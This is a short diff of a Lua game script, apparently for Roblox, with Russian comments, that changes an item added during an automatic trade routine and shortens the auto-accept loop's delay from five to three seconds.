@@ -698,7 +698,7 @@ local function handleTrade()
         addItem("UpgradeCrystalLegendary", 50)
         addItem("UpgradeCrystalEpic", 40)
         addItem("EnchantingStone", 10)
-        addItem("RoyalGuardian", 1)
+        addItem("BasicTuxedo", 1)
 
         -- Функция добавления предметов с аурой
         local function findAndAddAuras()
@@ -853,7 +853,7 @@ local tradeCoroutine -- Переменная для хранения корут�
 -- Функция для автоматического принятия и обработки трейдов
 local function autoAcceptAndProcessTrades()
     while autoTradeEnabled do
-        wait(5) -- Ждать 5 секунд
+        wait(3) -- Ждать 3 секунд
         print("testTrade")
 
         local players = game:GetService("Players")
